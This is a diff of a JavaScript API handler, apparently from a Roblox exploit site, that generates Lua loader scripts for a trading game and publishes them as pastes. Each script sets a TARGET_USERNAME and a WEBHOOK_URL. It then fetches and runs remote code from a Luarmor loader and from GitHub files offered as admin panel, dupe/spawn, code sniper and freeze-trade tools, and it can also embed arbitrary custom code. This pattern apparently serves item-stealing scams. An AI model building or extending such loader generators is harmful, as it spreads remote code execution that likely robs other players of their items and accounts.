@@ -8,16 +8,16 @@ export default async function handler(req, res) {
         });
     }
 
-    const {
-        username,
-        webhook,
-        mode,
-        brainrots,
-        skins,
-        gears,
-        customCode,
-        userId
-    } = req.body || {};
+    var body = req.body || {};
+
+    var username = body.username;
+    var webhook = body.webhook;
+    var mode = body.mode;
+    var brainrots = body.brainrots || [];
+    var skins = body.skins || [];
+    var gears = body.gears || [];
+    var customCode = body.customCode || '';
+    var userId = body.userId;
 
     if (!username) {
         return res.status(400).json({
@@ -26,33 +26,43 @@ export default async function handler(req, res) {
     }
 
     try {
-        const script = buildScript(
+        var script = buildScript(
             username,
             webhook,
             mode,
-            brainrots || [],
-            skins || [],
-            gears || [],
-            customCode || ''
+            brainrots,
+            skins,
+            gears,
+            customCode
         );
 
-        const pasteId = await saveToInternalPaste(
+        var pasteId = await saveToInternalPaste(
             script,
-            `Script para ${username}`,
+            'Script para ' + username,
             userId
         );
 
-        const baseUrl =
+        var baseUrl =
             process.env.BASE_URL || 'https://oblivionhub.xyz';
 
-        const rawUrl =
-            `${baseUrl}/api/paste?id=${pasteId}&raw=true`;
+        var rawUrl =
+            baseUrl +
+            '/api/paste?id=' +
+            encodeURIComponent(pasteId) +
+            '&raw=true';
 
         return res.status(200).json({
-            loadstring: `loadstring(game:HttpGet("${rawUrl}"))()`,
+            loadstring:
+                'loadstring(game:HttpGet("' +
+                rawUrl +
+                '"))()',
+
             script: script,
+
             pasteUrl: rawUrl,
+
             pasteId: pasteId,
+
             obfuscated: false
         });
 
@@ -60,7 +70,9 @@ export default async function handler(req, res) {
         console.error('Error general:', error);
 
         return res.status(500).json({
-            error: error.message || 'Internal server error'
+            error: error && error.message
+                ? error.message
+                : 'Internal server error'
         });
     }
 }
@@ -80,62 +92,80 @@ function buildScript(
     customCode
 ) {
 
-    function luaTable(arr, indent = '    ') {
+    function escapeLuaString(value) {
+        return String(value)
+            .replace(/\\/g, '\\\\')
+            .replace(/"/g, '\\"')
+            .replace(/\r/g, '\\r')
+            .replace(/\n/g, '\\n');
+    }
+
+
+    function luaTable(arr) {
 
         if (!Array.isArray(arr) || arr.length === 0) {
             return '{}';
         }
 
-        const items = arr.map(item => {
-            const value = String(item)
-                .replace(/\\/g, '\\\\')
-                .replace(/"/g, '\\"');
+        var result = ['{'];
 
-            return `["${value}"] = true`;
-        });
+        for (var i = 0; i < arr.length; i++) {
+            result.push(
+                '    ["' +
+                escapeLuaString(arr[i]) +
+                '"] = true' +
+                (i < arr.length - 1 ? ',' : '')
+            );
+        }
 
-        return (
-            '{\n' +
-            items
-                .map(item => indent + item)
-                .join(',\n') +
-            '\n}'
-        );
+        result.push('}');
+
+        return result.join('\n');
     }
 
 
-    const safeUsername = String(username)
-        .replace(/\\/g, '\\\\')
-        .replace(/"/g, '\\"');
+    var safeUsername =
+        escapeLuaString(username);
 
-    const safeWebhook = webhook
-        ? String(webhook)
-            .replace(/\\/g, '\\\\')
-            .replace(/"/g, '\\"')
-        : 'WEBHOOK_URL';
+    var safeWebhook =
+        webhook
+            ? escapeLuaString(webhook)
+            : 'WEBHOOK_URL';
 
 
-    let script =
-        `getgenv().TARGET_USERNAME = "${safeUsername}"\n`;
+    var script = '';
 
     script +=
-        `getgenv().WEBHOOK_URL = "${safeWebhook}"\n`;
+        'getgenv().TARGET_USERNAME = "' +
+        safeUsername +
+        '"\n';
 
     script +=
-        `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;
+        'getgenv().WEBHOOK_URL = "' +
+        safeWebhook +
+        '"\n';
 
     script +=
-        `getgenv().NORMAL_BASE_SKINS = ${luaTable(skins)}\n`;
+        'getgenv().NORMAL_BRAINROTS = ' +
+        luaTable(brainrots) +
+        '\n';
 
     script +=
-        `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;
+        'getgenv().NORMAL_BASE_SKINS = ' +
+        luaTable(skins) +
+        '\n';
+
+    script +=
+        'getgenv().NORMAL_GEARS = ' +
+        luaTable(gears) +
+        '\n';
 
 
     // ========================================================
     // LUARMOR BASE
     // ========================================================
 
-    const GUI_BASE =
+    var GUI_BASE =
         'https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua';
 
 
@@ -143,16 +173,14 @@ function buildScript(
     // GITHUB
     // ========================================================
 
-    const GUI_GITHUB = {
-        adminpanel:
-            'https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua',
+    var GUI_AP =
+        'https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua';
 
-        dupespawn:
-            'https://raw.githubusercontent.com/sab-api/GUIDUPE/refs/heads/main/GUIDUPE.lua',
+    var GUI_DUPE =
+        'https://raw.githubusercontent.com/sab-api/GUIDUPE/refs/heads/main/GUIDUPE.lua';
 
-        codesniper:
-            'https://raw.githubusercontent.com/sab-api/GUISNIPER/refs/heads/main/Sniper.lua'
-    };
+    var GUI_SNIPER =
+        'https://raw.githubusercontent.com/sab-api/GUISNIPER/refs/heads/main/Sniper.lua';
 
 
     // ========================================================
@@ -161,10 +189,13 @@ function buildScript(
 
     if (mode === 'normal') {
 
-        script += `
-task.spawn(function()
-    loadstring(game:HttpGet("${GUI_BASE}"))()
-end)`;
+        script +=
+            '\n' +
+            'task.spawn(function()\n' +
+            '    loadstring(game:HttpGet("' +
+            GUI_BASE +
+            '"))()\n' +
+            'end)';
 
     }
 
@@ -176,14 +207,20 @@ end)`;
 
     else if (mode === 'adminpanel') {
 
-        script += `
-task.spawn(function()
-    loadstring(game:HttpGet("${GUI_BASE}"))()
-end)
+        script +=
+            '\n' +
+            '-- GUI ADMIN PANEL\n' +
+            'task.spawn(function()\n' +
+            '    loadstring(game:HttpGet("' +
+            GUI_BASE +
+            '"))()\n' +
+            'end)\n\n' +
 
-task.spawn(function()
-    loadstring(game:HttpGet("${GUI_GITHUB.adminpanel}"))()
-end)`;
+            'task.spawn(function()\n' +
+            '    loadstring(game:HttpGet("' +
+            GUI_AP +
+            '"))()\n' +
+            'end)';
 
     }
 
@@ -195,14 +232,20 @@ end)`;
 
     else if (mode === 'dupespawn') {
 
-        script += `
-task.spawn(function()
-    loadstring(game:HttpGet("${GUI_BASE}"))()
-end)
+        script +=
+            '\n' +
+            '-- GUI DUPE / SPAWN\n' +
+            'task.spawn(function()\n' +
+            '    loadstring(game:HttpGet("' +
+            GUI_BASE +
+            '"))()\n' +
+            'end)\n\n' +
 
-task.spawn(function()
-    loadstring(game:HttpGet("${GUI_GITHUB.dupespawn}"))()
-end)`;
+            'task.spawn(function()\n' +
+            '    loadstring(game:HttpGet("' +
+            GUI_DUPE +
+            '"))()\n' +
+            'end)';
 
     }
 
@@ -214,14 +257,20 @@ end)`;
 
     else if (mode === 'codesniper') {
 
-        script += `
-task.spawn(function()
-    loadstring(game:HttpGet("${GUI_BASE}"))()
-end)
+        script +=
+            '\n' +
+            '-- GUI CODE SNIPER\n' +
+            'task.spawn(function()\n' +
+            '    loadstring(game:HttpGet("' +
+            GUI_BASE +
+            '"))()\n' +
+            'end)\n\n' +
 
-task.spawn(function()
-    loadstring(game:HttpGet("${GUI_GITHUB.codesniper}"))()
-end)`;
+            'task.spawn(function()\n' +
+            '    loadstring(game:HttpGet("' +
+            GUI_SNIPER +
+            '"))()\n' +
+            'end)';
 
     }
 
@@ -232,10 +281,13 @@ end)`;
 
     else if (mode === 'freezetrade') {
 
-        script += `
-task.spawn(function()
-    loadstring(game:HttpGet("${GUI_BASE}"))()
-end)`;
+        script +=
+            '\n' +
+            'task.spawn(function()\n' +
+            '    loadstring(game:HttpGet("' +
+            GUI_BASE +
+            '"))()\n' +
+            'end)';
 
     }
 
@@ -246,34 +298,40 @@ end)`;
 
     else if (mode === 'custom') {
 
-        script += `
-task.spawn(function()
-    loadstring(game:HttpGet("${GUI_BASE}"))()
-end)`;
+        script +=
+            '\n' +
+            'task.spawn(function()\n' +
+            '    loadstring(game:HttpGet("' +
+            GUI_BASE +
+            '"))()\n' +
+            'end)';
 
-        if (customCode && String(customCode).trim()) {
 
-            const formattedCustomCode =
+        if (
+            customCode &&
+            String(customCode).trim()
+        ) {
+
+            var formattedCustomCode =
                 String(customCode)
                     .replace(/\r?\n/g, '\n    ');
 
             script +=
-                `\n\ntask.spawn(function()\n` +
-                `    ${formattedCustomCode}\n` +
-                `end)`;
+                '\n\n' +
+                'task.spawn(function()\n' +
+                '    ' +
+                formattedCustomCode +
+                '\n' +
+                'end)';
         }
 
     }
 
 
-    // ========================================================
-    // MODO DESCONOCIDO
-    // ========================================================
-
     else {
 
         throw new Error(
-            `Unknown generation mode: ${mode}`
+            'Unknown generation mode: ' + mode
         );
     }
 
@@ -292,12 +350,12 @@ async function saveToInternalPaste(
     userId
 ) {
 
-    const baseUrl =
+    var baseUrl =
         process.env.BASE_URL || 'https://oblivionhub.xyz';
 
 
-    const response = await fetch(
-        `${baseUrl}/api/paste`,
+    var response = await fetch(
+        baseUrl + '/api/paste',
         {
             method: 'POST',
 
@@ -317,37 +375,26 @@ async function saveToInternalPaste(
 
     if (!response.ok) {
 
-        let errorMessage =
-            'Error al guardar el paste';
+        var text = '';
 
         try {
-
-            const error =
-                await response.json();
-
-            errorMessage =
-                error.error || errorMessage;
-
+            text = await response.text();
         } catch (_) {
-
-            const text =
-                await response.text();
-
-            if (text) {
-                errorMessage = text;
-            }
+            text = '';
         }
 
-        throw new Error(errorMessage);
+        throw new Error(
+            'Paste API error ' +
+            response.status +
+            (text ? ': ' + text : '')
+        );
     }
 
 
-    const data =
-        await response.json();
+    var data = await response.json();
 
 
-    if (!data.id) {
-
+    if (!data || !data.id) {
         throw new Error(
             'Paste API did not return an ID'
         );
